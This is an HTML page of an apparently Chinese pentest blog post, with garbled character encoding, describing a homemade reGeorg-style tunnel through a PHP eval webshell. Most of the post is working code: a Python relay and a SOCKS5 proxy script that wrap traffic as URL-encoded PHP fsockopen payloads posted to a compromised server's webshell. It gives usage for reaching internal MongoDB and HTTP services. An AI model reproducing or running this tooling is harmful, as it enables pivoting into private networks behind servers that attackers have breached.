<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>PHP Eval HTTP Proxy | ğŸ˜Š#</title>
  <meta name="author" content="JKme">
  
  <meta name="description" content="èƒŒæ™¯: linuxï¼Œphpç¯å¢ƒä¸‹çš„reGeorgä¸å¯ç”¨ã€‚ç›®æ ‡: åˆ†æreGeorgçš„åŸç†å°è¯•æ”¹ä¸€ä¸‹ç»“æœ: é€ äº†ä¸€ä¸ªåŠæˆå“ï¼Œå› ä¸ºä¸èƒ½ä¿æŒsocksè¿é€šï¼Œå¯ä»¥ç”¨æ¥è®¿é—®ç®€å•çš„åè®®æµæ•°æ®ã€‚æ¯”å¦‚httpï¼Œmongoï¼Œredis
Protocols that are suitable to smuggle
  HTTP based protocol:
    Elastic, CouchDB, Mongodb, Docker

  Text-based protocol:
    FTP, SMTP, Redis, Memcached



å°è¯•1è¿™ä¸ªè„šæœ¬æ˜¯ä¸ªæ®‹çš„:
#coding: utf-8
import socket
import binascii
import requests


headers &amp;#x3D; &amp;#123;
&amp;quot;Host&amp;quot;: &amp;quot;&amp;quot;,
&amp;quot;Accept-Encoding&amp;quot;: &amp;quot;gzip, deflate&amp;quot;,
&amp;quot;User-Agent&amp;quot;: &amp;quot;Mozilla&amp;#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&amp;#x2F;20050405 Firefox&amp;#x2F;1.0 (Ubuntu package 1.0.2)&amp;quot;,
&amp;quot;Content-Type&amp;quot;: &amp;quot;application&amp;#x2F;x-www-form-urlencoded&amp;quot;,
&amp;quot;Connection&amp;quot;: &amp;quot;close&amp;quot;
&amp;#125;

url &amp;#x3D; &amp;quot;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;eval.php&amp;quot;
s &amp;#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((&amp;quot;127.0.0.1&amp;quot;,8889))
s.listen(5)
sock, addr_info &amp;#x3D; s.accept()

while True:
    print &amp;#39;Connect by &amp;#39;, addr_info
    data &amp;#x3D; sock.recv(102400)
    payload &amp;#x3D; &amp;#39;pass&amp;#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&amp;#39; + hex2bin(data) + &amp;quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&amp;#39;timed_out&amp;#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&amp;#39;false%20lala&amp;#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&amp;quot;
    print payload
    data2 &amp;#x3D; requests.post(url&amp;#x3D;url,headers&amp;#x3D;headers,data&amp;#x3D;payload,proxies&amp;#x3D;&amp;#123;&amp;quot;http&amp;quot;:&amp;quot;http:&amp;#x2F;&amp;#x2F;127.0.0.1:8080&amp;quot;&amp;#125;,timeout&amp;#x3D;30).content
    print data2
    print &amp;quot;sending data&amp;quot;
    sock.send(data2)
hex2bin is available with PHP Version &amp;gt;= 5.4.0
ç»‘å®šæœ¬æœºçš„8889ç«¯å£ï¼Œç„¶åmongoç›´æ¥è¿,mongo --port 8889,å¦‚æœæƒ³è§‚å¯Ÿä¹‹é—´çš„æµé‡å¯ä»¥è¿™æ ·åš:
 python mongo_proxy  &amp;#x2F;&amp;#x2F;ç›‘å¬8889
socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &amp;#x2F;&amp;#x2F;æµé‡è‚‰çœ¼å¯ä»¥çœ‹
mongo --port 8888  &amp;#x2F;&amp;#x2F;è¿æ¥8888
å‘æ•£ä¸€ä¸‹ï¼Œè¿™ä¸ªæ•´ä½“å°±æ˜¯ä¸€ä¸ªè¯·æ±‚ä»£ç†ï¼ŒåŒ…è£¹ä¸€ä¸‹å‘é€åˆ°äº†è¿œç¨‹çš„webshellï¼Œç„¶åwebshellä¹‹è¡Œè„šæœ¬ã€‚Regeorgæ˜¯æ›´é€šç”¨çš„æ–¹å¼ï¼Œä½ å¯ä»¥æŠŠè¿™ä¸ªè„šæœ¬çœ‹ä½œregeorgä½œç”¨çš„å­é›†ï¼Œå› ä¸ºå¦‚æœè¦è®¿é—®ç«¯å£ä¹‹ç±»çš„å°±éœ€è¦æ”¹è„šæœ¬äº†ã€‚
çœ‹äº†çœ‹Regeorgçš„å®ç°ï¼Œå°±æ˜¯æ¥å—socks5æˆ–è€…socks4çš„ä»£ç†ä¹‹åï¼Œå‘é€æ•°æ®åŒ…åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œè¿‡ç¨‹å¤§æ¦‚æ˜¯è¿™æ ·å­çš„:"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="PHP Eval HTTP Proxy"/>
  <meta property="og:site_name" content="ğŸ˜Š#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="ğŸ˜Š#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ğŸ˜Š#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> PHP Eval HTTP Proxy</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>èƒŒæ™¯: linuxï¼Œphpç¯å¢ƒä¸‹çš„reGeorgä¸å¯ç”¨ã€‚<br>ç›®æ ‡: åˆ†æreGeorgçš„åŸç†å°è¯•æ”¹ä¸€ä¸‹<br>ç»“æœ: é€ äº†ä¸€ä¸ªåŠæˆå“ï¼Œå› ä¸ºä¸èƒ½ä¿æŒsocksè¿é€šï¼Œå¯ä»¥ç”¨æ¥è®¿é—®ç®€å•çš„åè®®æµæ•°æ®ã€‚æ¯”å¦‚httpï¼Œmongoï¼Œredis</p>
<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
  HTTP based protocol:
    Elastic, CouchDB, Mongodb, Docker

  Text-based protocol:
    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="å°è¯•1"><a href="#å°è¯•1" class="headerlink" title="å°è¯•1"></a>å°è¯•1</h3><p>è¿™ä¸ªè„šæœ¬æ˜¯ä¸ªæ®‹çš„:</p>
<pre class="line-numbers language-none"><code class="language-none">#coding: utf-8
import socket
import binascii
import requests


headers &#x3D; &#123;
&quot;Host&quot;: &quot;&quot;,
&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,
&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,
&quot;Connection&quot;: &quot;close&quot;
&#125;

url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;
s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((&quot;127.0.0.1&quot;,8889))
s.listen(5)
sock, addr_info &#x3D; s.accept()

while True:
    print &#39;Connect by &#39;, addr_info
    data &#x3D; sock.recv(102400)
    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;
    print payload
    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content
    print data2
    print &quot;sending data&quot;
    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
<p>ç»‘å®šæœ¬æœºçš„8889ç«¯å£ï¼Œç„¶åmongoç›´æ¥è¿,<code>mongo --port 8889</code>,å¦‚æœæƒ³è§‚å¯Ÿä¹‹é—´çš„æµé‡å¯ä»¥è¿™æ ·åš:</p>
 <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;ç›‘å¬8889
socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;æµé‡è‚‰çœ¼å¯ä»¥çœ‹
mongo --port 8888  &#x2F;&#x2F;è¿æ¥8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>å‘æ•£ä¸€ä¸‹ï¼Œè¿™ä¸ªæ•´ä½“å°±æ˜¯ä¸€ä¸ªè¯·æ±‚ä»£ç†ï¼ŒåŒ…è£¹ä¸€ä¸‹å‘é€åˆ°äº†è¿œç¨‹çš„webshellï¼Œç„¶åwebshellä¹‹è¡Œè„šæœ¬ã€‚Regeorgæ˜¯æ›´é€šç”¨çš„æ–¹å¼ï¼Œä½ å¯ä»¥æŠŠè¿™ä¸ªè„šæœ¬çœ‹ä½œregeorgä½œç”¨çš„<code>å­é›†</code>ï¼Œå› ä¸ºå¦‚æœè¦è®¿é—®ç«¯å£ä¹‹ç±»çš„å°±éœ€è¦æ”¹è„šæœ¬äº†ã€‚</p>
<p>çœ‹äº†çœ‹Regeorgçš„å®ç°ï¼Œå°±æ˜¯æ¥å—socks5æˆ–è€…socks4çš„ä»£ç†ä¹‹åï¼Œå‘é€æ•°æ®åŒ…åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œè¿‡ç¨‹å¤§æ¦‚æ˜¯è¿™æ ·å­çš„:</p>
<pre class="line-numbers language-none"><code class="language-none">Connect: è¿æ¥ä¹‹åç”Ÿæˆä¸€ä¸ªcookie

Forward: æŠŠè¦è¯·æ±‚çš„æ•°æ®åŒ…æ”¾åœ¨cookieé‡Œé¢çš„writebuf

Read: Regeorgçš„è„šæœ¬è¯»å–writbufçš„æ•°æ®åŒ…ä¹‹åè¯·æ±‚æ¥å£æœåŠ¡ï¼Œæ¯”å¦‚curlè®¿é—®å†…ç½‘ç«¯å£ã€‚ç„¶åæŠŠç»“æœå†™å…¥åˆ°cookieé‡Œé¢çš„readbufï¼Œè¯»å–readbufçš„å†…å®¹

Disconnect: æŠŠcookieé‡Œé¢çš„runæ ‡å¿—å˜ä¸ºfalseï¼Œcookieå°±ä¸å†ä½¿ç”¨äº†ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‰€ä»¥å½“Regeorgä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œæ¯”å¦‚ç¬¬ä¸€æ­¥çš„connectæ— æ³•ç”Ÿæˆã€‚<br>ä¸Šé¢è„šæœ¬çš„è¿‡ç¨‹æ˜¯è¿™æ ·å­çš„: æˆ‘çœ‹äº†çœ‹regeorgçš„æºä»£ç ï¼Œç™¾æ€ä¸å¾—å…¶è§£ä¸ºä»€ä¹ˆconnectæ²¡ç”Ÿæˆï¼Œè°ƒè¯•äº†å‡ å¤©æ²¡ç»“æœã€‚ï¼ˆå¥½èœ.jpg)ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘å‘ç°regeorgçš„phpåŸç†åŸºæœ¬å°±æ˜¯ä¸Šé¢çš„æ­¥éª¤ã€‚æ‰€ä»¥æˆ‘å°±æ‰‹åŠ¨å†™è„šæœ¬å°è¯•å¯è¡Œã€‚</p>
<p>æœ‰ä¸€ä¸ªä¸çŸ¥é“æ˜¯ä»€ä¹ˆå‘çš„é—®é¢˜: å½“æˆ‘æŠŠipä½œä¸ºå˜é‡å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨çš„æ—¶å€™ï¼Œè¿œç¨‹æœåŠ¡å™¨ä¼šå‡ºç°epool_waitçš„é”™è¯¯ã€‚ä½†æ˜¯å½“æ•´ä¸ªè„šæœ¬æ”¾åœ¨è¿œç¨‹æœåŠ¡å™¨çš„æ—¶å€™å°±å¯ä»¥è¿è¡Œäº†ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">å¤±è´¥:

&lt;?php
$ip &#x3D; $_POST[&#39;ip&#39;];
$port &#x3D; $_POST[&#39;port&#39;];
$com &#x3D; $_POST[&#39;command&#39;];
$payload &#x3D; $com.&#39;\r\n&#39;;
$res &#x3D; fsockopen($ip,(int)$port,$errno, $errstr);
&#x2F;&#x2F;$res &#x3D; stream_socket_client(&quot;tcp:&#x2F;&#x2F;127.0.0.1:6379&quot;, $errno, $errstr);
var_dump($res);
stream_set_timeout(1);
stream_set_blocking(false);
fwrite($res,$raw);
while ($o&#x3D;fgets($res,5))&#123;
$readbuf .&#x3D; $o;
&#125;
var_dump($readbuf);

fclose($res);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">æˆåŠŸ:

&lt;?php
$res &#x3D; fsockopen(&quot;127.0.0.1&quot;,6379);
$raw &#x3D; &quot;info\r\n&quot;;
stream_set_timeout($res,1);
stream_set_blocking(false);
fwrite($res,$raw);
$info &#x3D; stream_get_meta_data($res);
echo $info[&#39;timed_out&#39;];
while ($o &#x3D;fgets($res,5))&#123;
        if($o &#x3D;&#x3D;&#x3D; false)&#123;echo &#39;false lala&#39;;&#125;
$readBuff .&#x3D; $o;
&#125;
var_dump($readBuff);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‰€ä»¥æˆ‘åˆ°äº†ç°åœ¨è¿™ä¸€æ­¥ï¼Œå…¶å®æ˜¯ä¸­é—´å‘ç°antswordçš„æ‰«æç«¯å£åŸç†ï¼Œå°±æ˜¯åŒ…è£…å¥½æ•°æ®åŒ…å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œè¿œç¨‹æœåŠ¡å™¨åšä¸€ä¸ªevalã€‚</p>
<p>æ—¢ç„¶æ˜¯evaläº†ï¼Œé‚£ä¹ˆå°±æ˜¯è·Ÿxssä¸€ä¸ªåŸç†: ä½ æœ‰äº†ä¸€ä¸ªâ€ç¼–è¾‘å™¨â€ã€‚</p>
<p>æ‰€ä»¥å‘¢ï¼Œå†çœ‹çœ‹å‰é¢çš„regeorgçš„åŸç†ï¼Œå‰©ä¸‹æœ€åä¸€æ­¥äº†ï¼Œæ”¹é€ ä¸Šé¢çš„è„šæœ¬ï¼Œè®©ä»–é€‚åˆproxychainsã€‚</p>
<h3 id="å°è¯•2"><a href="#å°è¯•2" class="headerlink" title="å°è¯•2"></a>å°è¯•2</h3><pre class="line-numbers language-none"><code class="language-none"># coding: utf-8
import socket
import binascii
import urllib
import sys
import requests

VER &#x3D; &quot;\x05&quot;
METHOD &#x3D; &quot;\x00&quot;
SUCCESS &#x3D; &quot;\x00&quot;
SOCKFAIL &#x3D; &quot;\x01&quot;
NETWORKFAIL &#x3D; &quot;\x02&quot;
HOSTFAIL &#x3D; &quot;\x04&quot;
REFUSED &#x3D; &quot;\x05&quot;
TTLEXPIRED &#x3D; &quot;\x06&quot;
UNSUPPORTCMD &#x3D; &quot;\x07&quot;
ADDRTYPEUNSPPORT &#x3D; &quot;\x08&quot;
UNASSIGNED &#x3D; &quot;\x09&quot;



def parseSocks5(sock):

    nmethods, methods &#x3D; (sock.recv(1), sock.recv(1))
    # print nmethods,methods
    sock.sendall(VER + METHOD)
    ver &#x3D; binascii.b2a_hex(sock.recv(1))
    # print &quot;ver:%s &quot; % ver  #socks version: socks5 or socks4

    if ver &#x3D;&#x3D; &quot;\x02&quot;:  # this is a hack for proxychains
        ver, cmd, rsv, atyp &#x3D; (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))
    else:
        cmd, rsv, atyp &#x3D; (sock.recv(1), sock.recv(1), sock.recv(1))
    target &#x3D; None
    targetPort &#x3D; None

    if atyp &#x3D;&#x3D; &quot;\x01&quot;:  # IPv4
                # Reading 6 bytes for the IP and Port
        target &#x3D; sock.recv(4)
        targetPort &#x3D; sock.recv(2)
        target &#x3D; &quot;.&quot; .join([str(ord(i)) for i in target])
    elif atyp &#x3D;&#x3D; &quot;\x03&quot;:  # Hostname
        targetLen &#x3D; ord(sock.recv(1))  # hostname length (1 byte)
        target &#x3D; sock.recv(targetLen)
        targetPort &#x3D; sock.recv(2)
        target &#x3D; &quot;&quot;.join([unichr(ord(i)) for i in target])
    elif atyp &#x3D;&#x3D; &quot;\x04&quot;:  # IPv6
        target &#x3D; sock.recv(16)
        targetPort &#x3D; sock.recv(2)
        tmp_addr &#x3D; []
        for i in xrange(len(target) &#x2F; 2):
            tmp_addr.append(unichr(ord(target[2 * i]) * 256 + ord(target[2 * i + 1])))
        target &#x3D; &quot;:&quot;.join(tmp_addr)
    targetPort &#x3D; ord(targetPort[0]) * 256 + ord(targetPort[1])
    # print targetPort
    # print target

    if cmd &#x3D;&#x3D; &quot;\x02&quot;:  # BIND
        raise SocksCmdNotImplemented(&quot;Socks5 - BIND not implemented&quot;)
    elif cmd &#x3D;&#x3D; &quot;\x03&quot;:  # UDP
        raise SocksCmdNotImplemented(&quot;Socks5 - UDP not implemented&quot;)
    elif cmd &#x3D;&#x3D; &quot;\x01&quot;:  # CONNECT
        serverIp &#x3D; target
        serverIp &#x3D; &quot;&quot;.join([chr(int(i)) for i in serverIp.split(&quot;.&quot;)])

    sock.sendall(VER + SUCCESS + &quot;\x00&quot; + &quot;\x01&quot; + serverIp + chr(targetPort &#x2F; 256) + chr(targetPort % 256))
    # print &quot;recv: %s&quot; % binascii.b2a_hex(sock.recv(1024))
    return target,targetPort


def sendPayload(sock,flag&#x3D;&#39;&#39;):
    print &quot;[Prepare Payload]&quot;
    try:
        data &#x3D; sock.recv(20480)
    except:
        print &quot;Closing Proxy&quot;
        s.close()
        exit(0)

    if data:
        print &quot;&lt;&lt; Recving Data From Client&quot;
        tmp_payload &#x3D; &quot;$res &#x3D; fsockopen(&#39;%s&#39;,%s);&quot; % (target, targetPort)
        tmp_payload +&#x3D; &quot;$raw &#x3D; hex2bin(&#39;&quot; + binascii.b2a_hex(flag+data) + &quot;&#39;);&quot;
        tmp_payload +&#x3D; &quot;stream_set_timeout($res,1);&quot;
        # tmp_payload +&#x3D; &quot;stream_set_blocking(true);&quot;
        tmp_payload +&#x3D; &quot;fwrite($res,$raw);&quot;
        tmp_payload +&#x3D; &quot;while ($o &#x3D;fgets($res,100))&#123;if($o &#x3D;&#x3D;&#x3D; false)&#123;echo &#39;Connect Failed&#39;;&#125;&quot;
        tmp_payload +&#x3D; &quot;$readBuff .&#x3D; $o;&#125;&quot;
        tmp_payload +&#x3D; &quot;echo $readBuff;&quot;
        tmp_payload +&#x3D; &quot;fclose($res);&quot;
        # print tmp_payload
        payload &#x3D; urllib.quote(tmp_payload)
        # print &quot;The payload is: %s&quot; %payload
        shell &#x3D; sys.argv[1]
        p &#x3D; sys.argv[2]
        exp &#x3D; &quot;%s&#x3D;%s&quot; % (p, payload)
        content &#x3D; requests.post(shell, data&#x3D;exp, proxies&#x3D;&#123;&quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,
                                headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;).content
        sock.send(content)
        print &quot;&gt;&gt; Sending Data to Client&quot;
        flag2 &#x3D; sock.recv(1)
        while flag2:
            sendPayload(sock,flag2)
        # else:
        #     s.close()
        #     exit(0)
        # # s.close()
    else:
        pass

s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 2)
s.bind((&quot;127.0.0.1&quot;, 9999))
s.listen(5)


while 1:
    try:
        sock, addr_info &#x3D; s.accept()
        print &quot;[Accept Bytes]&quot;
        flag &#x3D; sock.recv(1)

        if flag &#x3D;&#x3D; &quot;\x05&quot;:
            target, targetPort &#x3D; parseSocks5(sock)
            sendPayload(sock)
        else:
            sendPayload(sock,flag)
    except KeyboardInterrupt:
        exit(0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½¿ç”¨æ–¹æ³•: <code>python rego.py &lt;webshell&gt; &lt;webshell&#39;s pass&gt;</code> </p>
<p>è¿™ä¸ªå¾ˆçƒ‚çš„å•çº¿ç¨‹ä»£ç å®ç°äº†è¿™æ ·çš„åŠŸèƒ½:</p>
<ol>
<li>å¼€å¯ä¸€ä¸ªæœ¬åœ°çš„9999çš„socks5ä»£ç†</li>
<li>ä½¿ç”¨è¿™ä¸ªä»£ç†å¯ä»¥ç”¨curlè®¿é—®å†…ç½‘webæœåŠ¡</li>
<li>å¯ä»¥è®¿é—®è¿™äº›æ•°æ®åº“ï¼Œmongoå¯ç”¨</li>
<li>ä½¿ç”¨äº†8080ä½œä¸ºä»£ç†ï¼Œæ”¾åœ¨burpé‡Œé¢çœ‹æµé‡</li>
</ol>
<p>æœ‰è¿™æ ·çš„ç¼ºç‚¹:</p>
<ol>
<li>curlè®¿é—®webå’Œè®¿é—®mongoåªèƒ½é€‰ä¸€ä¸ª(æ¯”å¦‚å¼€äº†ä¸¤ä¸ªçª—å£ï¼Œä¸€ä¸ªè®¿é—®httpï¼Œä¸€ä¸ªè®¿é—®mongo)</li>
<li>é€Ÿåº¦å¾ˆæ…¢ï¼Œå–å†³äºå®é™…ç¯å¢ƒï¼Œè‡ªå·±è°ƒtimeout</li>
<li>sshæˆ–è€…mysqlä¸èƒ½ç”¨ï¼Œå› ä¸ºæ²¡æœ‰ä¿æŒsocksè¿æ¥ã€‚</li>
</ol>
<p>ä¸ºä»€ä¹ˆreGeorgå°±å¯ä»¥ï¼Ÿå› ä¸ºreGeorgç”¨<code>while true</code>å¾ªç¯ä¿æŒäº†socksè¿æ¥ï¼Œé€šè¿‡å†™å…¥cookieçš„æ•°æ®è¿›è¡Œäº¤äº’ã€‚</p>
<p>æµ‹è¯•ä¸»è¦ä½¿ç”¨äº†socatè½¬å‘æµé‡:</p>
<pre class="line-numbers language-none"><code class="language-none">socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>æµ‹è¯•äº†ä¸‹redisä¸å¯ç”¨ï¼Œå› ä¸ºé»˜è®¤redisä½¿ç”¨çš„æ˜¯RESPçš„åè®®ã€‚</p>

	</div>

	
	<span id="/2019/10/23/php-eval-proxy.html" class="leancloud-visitors view" data-flag-title="PHP Eval HTTP Proxy">
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2019/12/13/python-debug.html" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2019/10/23/winrm.html" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2019-10-23 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Pentest/">Pentest<span>51</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%951"><span class="toc-article-text">å°è¯•1</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%952"><span class="toc-article-text">å°è¯•2</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#END"><span class="toc-article-text">END</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2023 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


